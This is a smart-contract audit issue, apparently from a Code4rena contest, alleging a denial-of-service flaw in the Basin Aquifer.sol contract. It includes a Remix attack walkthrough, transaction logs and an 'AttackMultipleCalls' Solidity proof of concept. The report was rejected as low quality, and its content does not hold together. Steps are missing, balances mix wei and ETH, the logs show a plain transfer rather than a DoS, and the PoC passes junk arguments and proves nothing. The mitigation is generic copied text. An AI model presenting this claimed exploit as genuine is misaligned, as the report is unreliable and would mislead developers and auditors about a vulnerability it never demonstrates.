# #94: M-01 SWC-113 DoS with Failed Call
Labels: ['bug', '2 (Med Risk)', 'low quality report', 'unsatisfactory']
Accepted: False

# Lines of code

https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Aquifer.sol#L55
https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Aquifer.sol#L69


# Vulnerability details

## [M-01]
SWC-113 DoS with Failed Call

## Impact
File
```txt
../src/Aquifer.sol
```

URL
```txt
https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Aquifer.sol#L55
https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Aquifer.sol#L69
```

External calls can fail accidentally or deliberately, which can cause a DoS condition in the contract. 
```txt
External calls can fail accidentally or deliberately, which can cause a DoS condition in the contract. 
To minimize the damage caused by such failures, it is better to isolate each external call into its own transaction that can be initiated by the recipient of the call. 
This is especially relevant for payments, where it is better to let users withdraw funds rather than push funds to them automatically (this also reduces the chance of problems with the gas limit).
```

## Proof of Concept
Current code
```sol
// line 55
 (bool success, bytes memory returnData) = well.call(initFunctionCall);
// line 69
if (IWell(well).aquifer() != address(this)) {
```

Dos Test Case
```txt
NB: Using Remix (VM) London
1. switch to first account (as alice) and deploy the victim contract with 10000 eth.
2. switch to second account (as eve) and deploy the attack contract with 10000 eth. 
4. switch to second account (as eve) and select 111 eth and paste victim contract address for alice in input box next to button for attack() and then click attack() button.
5. in account 2 for eve, click getbalance button and balance is 10111 wei.
```

Logs

Victim Address
```txt
0x70997970C51812dc3A010C7d01b50e0d17dc79C8
```

Attacker Address
```txt
0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
```

Attacker Balance After Attack button is clicked
```txt
Balance: 10111 ETH
```

Victim Balance After Attack button is clicked
```txt
Balance: 9888.999866634808495176 ETH
```

```txt
[block:4 txIndex:0]from: 0x709...c79C8to: IERC5267Upgradeable.(fallback) 0x3C4...293BCvalue: 111000000000000000000 weidata: 0xd01...c79c8logs: 0hash: 0xf53...392ea
status	true Transaction mined and execution succeed
transaction hash	0x7b5c3b3b37f83b226689cb548bb10630e3438077c265f4f58ed51b5f59e7f125
from	0x70997970C51812dc3A010C7d01b50e0d17dc79C8
to	IERC5267Upgradeable.(fallback) 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
gas	21432 gas
transaction cost	21432 gas 
input	0xd01...c79c8
decoded input	-
decoded output	 - 
logs	[]
val	111000000000000000000 wei
```

PoC
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

import "../src/Aquifer.sol";

contract AttackMultipleCalls {
    
    uint256 public i = 111;
    bytes public iex = abi.encodePacked(i);

    function attack(Aquifer aquifer) public payable {
        aquifer.boreWell(
        address(aquifer),
        iex,
        iex,
        "0xh3xh3xh3xh3xh3xh3xh3xh3xh3xh3x"
    );
    }

    function getBalance() public payable {
        address(this).balance;
    }
}
```

## Tools Used
```txt
Mythx + VS Code + Remix
```

## Recommended Mitigation Steps
```txt
Avoid combining multiple calls in a single transaction, especially when calls are executed as part of a loop
Always assume that external calls can fail
Implement the contract logic to handle failed calls
```


## Assessed type

DoS